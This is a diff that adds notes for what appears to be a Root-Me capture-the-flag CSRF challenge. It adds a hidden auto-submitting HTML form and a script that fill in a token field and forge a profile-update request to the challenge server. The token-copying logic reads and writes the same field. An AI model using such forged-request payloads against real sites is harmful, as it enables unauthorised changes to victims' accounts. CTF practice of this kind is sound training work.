@@ -77,3 +77,26 @@ $ csrf
 
 ```
 
+```
+
+
+<form id="profile" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="POST" enctype="multipart/form-data">
+  <input type="hidden" name="username" value="a"/>
+  <input type="hidden" name="status" value="on"/>
+  <input type="hidden" id="token1" name="token" value=""/>
+ 
+</form>
+
+<script>
+
+var loginForm = document.forms.profile; // Or document.forms['login']
+  
+ 
+    oko=document.forms['profile']["token"].value;// set oke= value token
+      
+
+document.getElementById("token1").value = oko; // set id['token1']=oko
+document.forms["profile"].submit(); //auto submit form
+</script>
+
+```
